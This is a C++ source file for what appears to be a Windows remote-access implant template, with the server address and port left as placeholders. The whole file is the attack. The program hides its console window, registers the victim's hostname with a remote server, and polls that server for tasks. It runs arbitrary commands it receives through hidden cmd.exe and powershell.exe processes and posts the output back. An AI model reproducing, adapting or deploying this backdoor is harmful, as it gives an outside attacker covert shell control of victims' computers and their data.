#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#define TEMPLATE_EOF 52736

std::wstring get_utf16(const std::string& str, int codepage)
{
    if (str.empty()) return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}

std::string Get(std::string ip, unsigned int port, std::string uri)
{
    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"GET", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }

    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::string Post(std::string ip, unsigned int port, std::string uri, std::string dat)
{
    LPSTR data = const_cast<char*>(dat.c_str());
    DWORD data_len = strlen(data);
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1;

    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"POST", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }

    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength,
            (LPVOID)data, data_len, data_len, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::vector<std::string> splits(std::string cmd, char delim = ' ')
{
    std::vector<std::string> result;
    std::stringstream ss(cmd);
    std::string token;

    while (std::getline(ss, token, delim)) {
        result.push_back(token);
    }

    return result;
}

std::string shell(const wchar_t* cmd)
{
    std::string result;
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
        return result;

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    BOOL fSuccess = CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return result;
    }

    bool bProcessEnded = false;
    for (; !bProcessEnded;)
    {
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail)
                break;

            if (!::ReadFile(hPipeRead, buf, std::min(sizeof(buf) - 1, static_cast<size_t>(dwAvail)), &dwRead, NULL) || !dwRead)
                break;

            buf[dwRead] = 0;
            result += buf;
        }
    }

    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

int main(int argc, char const* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::string name;
    std::string type = "w";
    int n = 3000;

    std::string ip = "{{IP_PLACEHOLDER}}";
    unsigned int port = {{PORT_PLACEHOLDER}};

    std::string hname = "";
    std::string hnamecc = "cmd.exe /c hostname";
    hname = shell(get_utf16(hnamecc, CP_UTF8).c_str());

    name = Post(ip, port, "/reg", "name=" + hname + "&type=" + type);

    while (true) {
        std::string task = Get(ip, port, "/tasks/" + name);

        if (!task.empty()) {
            std::vector<std::string> Task = splits(task);
            std::string command = Task[0];
            std::string res = "";

            if (command == "sleep") {
                int time = std::stoi(Task[1]);
                n = time * 1000;
            }
            else if (command == "quit") {
                exit(0);
            }
            else if (command == "rename") {
                name = Task[1];
            }
            else if (command == "shell") {
                std::string scommand = "cmd.exe /c ";

                for (int i = 1; i < Task.size(); i++) {
                    scommand += Task[i] + " ";
                }

                res = shell(get_utf16(scommand, CP_UTF8).c_str());
            }
            else if (command == "powershell") {
                std::string pscommand = "powershell.exe /c ";

                for (int i = 1; i < Task.size(); i++) {
                    pscommand += Task[i] + " ";
                }

                res = shell(get_utf16(pscommand, CP_UTF8).c_str());
            }

            Post(ip, port, "/results/" + name, "result=" + res);
        }

        Sleep(n);
    }
}
